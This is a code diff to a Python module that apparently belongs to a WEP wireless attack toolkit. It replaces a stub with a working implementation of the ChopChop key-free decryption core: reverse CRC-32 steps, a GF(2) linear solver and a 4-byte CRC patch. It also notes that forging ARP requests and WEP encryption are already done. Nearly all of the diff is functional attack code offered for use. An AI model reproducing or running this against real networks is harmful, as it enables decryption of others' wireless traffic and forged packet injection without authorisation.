@@ -11,9 +11,11 @@ The MAC header is cleartext; only plaintext++ICV is RC4'd. Forging needs only
 the *keystream* (the IV's RC4 output), never the key — the whole point of
 frag/chopchop.
 
-Status: icv / wep_encrypt / forge_arp_request are IMPLEMENTED + tested
-(tests/engine/test_wep_crypto.py). chop_last_byte_and_fixup is still a stub —
-the KoreK linear-ICV fix-up; do it next with heavy unit tests.
+Status: ALL implemented + tested offline (tests/engine/test_wep_crypto.py) —
+icv, wep_encrypt, forge_arp_request, and chop_last_byte_and_fixup (the KoreK
+linear-ICV fix-up, done via affine-CRC cancellation + a GF(2) trailing-byte
+solve, gated by a decrypt-and-check-residue oracle). The hardware-needing part
+is now ONLY the live-AP oracle in fragmentation.py / chopchop.py.
 """
 
 from __future__ import annotations
@@ -72,36 +74,96 @@ def forge_arp_request(
 # crc32(P) == CRC32_RESIDUE. This is what lets ChopChop cancel the unknown ICV.
 CRC32_RESIDUE = 0x2144DF1C
 
+# CRC-32 table (poly 0xEDB88320, reflected — same CRC as zlib/WEP) + the
+# reverse-lookup of table entries by their top byte (a permutation).
+_CRC_TABLE = []
+for _n in range(256):
+    _c = _n
+    for _ in range(8):
+        _c = (_c >> 1) ^ 0xEDB88320 if (_c & 1) else _c >> 1
+    _CRC_TABLE.append(_c)
+_CRC_REV_TOP = {(_CRC_TABLE[_i] >> 24): _i for _i in range(256)}
+
+
+def _crc_reg(data: bytes, reg: int = 0xFFFFFFFF) -> int:
+    """Raw CRC register (no final XOR) after processing ``data``."""
+    for byte in data:
+        reg = (reg >> 8) ^ _CRC_TABLE[(reg ^ byte) & 0xFF]
+    return reg
+
+
+def _crc(data: bytes) -> int:
+    """CRC-32 of data (matches zlib.crc32)."""
+    return _crc_reg(data) ^ 0xFFFFFFFF
+
+
+def _reverse_crc_byte(reg_after: int, byte: int) -> int:
+    """Inverse of one CRC step: given the register AFTER processing ``byte`` and
+    the byte, recover the register before. (Top byte of reg_after uniquely
+    picks the table entry that was XORed in.)"""
+    idx = _CRC_REV_TOP[reg_after >> 24]
+    return (((reg_after ^ _CRC_TABLE[idx]) << 8) & 0xFFFFFFFF) | ((idx ^ byte) & 0xFF)
+
+
+def _gf2_solve(cols: list, y: int) -> int:
+    """Solve XOR_{i : bit i of x set} cols[i] == y over GF(2). cols are 32
+    linearly-independent 32-bit vectors (full rank), so x is unique."""
+    pivots = {}  # high-bit -> (reduced vector, combination tag)
+    for i, vec in enumerate(cols):
+        v, tag = vec, 1 << i
+        for bit in range(31, -1, -1):
+            if not (v >> bit) & 1:
+                continue
+            if bit in pivots:
+                pv, pt = pivots[bit]
+                v ^= pv
+                tag ^= pt
+            else:
+                pivots[bit] = (v, tag)
+                break
+    x, yv = 0, y
+    for bit in range(31, -1, -1):
+        if not (yv >> bit) & 1:
+            continue
+        pv, pt = pivots[bit]
+        yv ^= pv
+        x ^= pt
+    return x
+
+
+def _patch_zeros(zlen: int, target_crc: int) -> bytes:
+    """Find the 4 bytes ``corr`` such that crc32(0^zlen ++ corr) == target_crc.
+    The map corr -> crc is affine + bijective, so solve it linearly."""
+    base = _crc(b"\x00" * zlen + b"\x00\x00\x00\x00")
+    cols = [
+        _crc(b"\x00" * zlen + (1 << i).to_bytes(4, "little")) ^ base
+        for i in range(32)
+    ]
+    return _gf2_solve(cols, target_crc ^ base).to_bytes(4, "little")
+
 
 def chop_last_byte_and_fixup(body: bytes, plaintext_guess: int) -> bytes:
-    """ChopChop core (STUB — M6): given an encrypted body whose ICV is valid,
-    return a one-byte-shorter body whose ICV is ALSO valid IFF ``plaintext_guess``
-    equals the true last plaintext byte (P[L-1]).
+    """ChopChop core: given an encrypted body whose ICV is valid, return a
+    one-byte-shorter body whose ICV is ALSO valid IFF ``plaintext_guess`` equals
+    the true last plaintext byte P[L-1]. No key needed — that's the attack.
 
-    WORKED-OUT RECIPE (the hard part — the unknown-ICV cancellation — is done;
-    only the standard reverse-CRC routine remains). With:
-      B    = body (len L),  S = keystream,  P = B^S (valid: crc32(P)==RESIDUE)
-      g    = plaintext_guess (the last plaintext byte P[L-1])
-    The result is ``B[:L-1]`` with its LAST 4 BYTES XORed by a 4-byte ``corr``:
-      B' = bytearray(B[:L-1]);  B'[L-5:L-1] ^= corr
-
-    Why this works (affine CRC + residue cancel the unknown ICV/keystream):
-      P' = P[:L-1] ^ corr_padded   (corr_padded = 0^(L-5) ++ corr)
-      valid(P')  ⟺  crc32(P') == RESIDUE
-      crc32(P') = crc32(P[:L-1]) ^ crc32(corr_padded) ^ crc32(0^(L-1))   [affine]
-      crc32(P[:L-1]) is computable from the KNOWN crc32(P)==RESIDUE and g, by
-        reversing ONE crc32 step over byte g (register form: reg=crc^0xFFFFFFFF;
-        reg(P)=RESIDUE^0xFFFFFFFF; reg(P[:L-1]) = reverse_step(reg(P), g)).
-      ⇒ require:  crc32(corr_padded) = RESIDUE ^ crc32(P[:L-1]) ^ crc32(0^(L-1))
-      Solve for the 4-byte ``corr`` with a standard reverse-CRC "patch" routine
-        (find 4 trailing bytes that drive the CRC to a target) — see Stigge et
-        al, "Reversing CRC". corr depends only on g + known quantities; the
-        unknown ICV and keystream are gone.
-
-    TODO next session: implement reverse_step + the 4-byte CRC patch (from a
-    reference), then this. UNIT-TEST against the oracle: build a body from a
-    known keystream + known plaintext, chop+fixup with the CORRECT last byte →
-    result XOR keystream must have a valid ICV (crc32==RESIDUE); a WRONG guess
-    must NOT. (The reverse-CRC patch is intricate bit-math — do not eyeball it,
-    TDD it.)"""
-    raise NotImplementedError("M6 — see recipe above; TDD the reverse-CRC patch")
+    Result = body[:-1] with its last 4 bytes XORed by a correction ``corr``
+    that depends only on the guess and known quantities. Derivation (affine CRC
+    + the residue cancel the unknown ICV/keystream):
+      P'  = P[:L-1] ^ (0^(L-5) ++ corr);  valid ⟺ crc32(P') == RESIDUE
+      crc32(P') = crc32(P[:L-1]) ^ crc32(0^(L-5)++corr) ^ crc32(0^(L-1))  [affine]
+      crc32(P[:L-1]) comes from the KNOWN crc32(P)==RESIDUE reversed one step
+        over the guessed byte ⇒ solve crc32(0^(L-5)++corr) for corr.
+    """
+    if len(body) < 5:
+        raise ValueError("body too short to chop")
+    n1 = len(body) - 1
+    reg_p = CRC32_RESIDUE ^ 0xFFFFFFFF                 # register of valid P
+    reg_pchop = _reverse_crc_byte(reg_p, plaintext_guess & 0xFF)
+    crc_pchop = reg_pchop ^ 0xFFFFFFFF
+    target = CRC32_RESIDUE ^ crc_pchop ^ _crc(b"\x00" * n1)
+    corr = _patch_zeros(n1 - 4, target)
+    out = bytearray(body[:n1])
+    for i in range(4):
+        out[n1 - 4 + i] ^= corr[i]
+    return bytes(out)
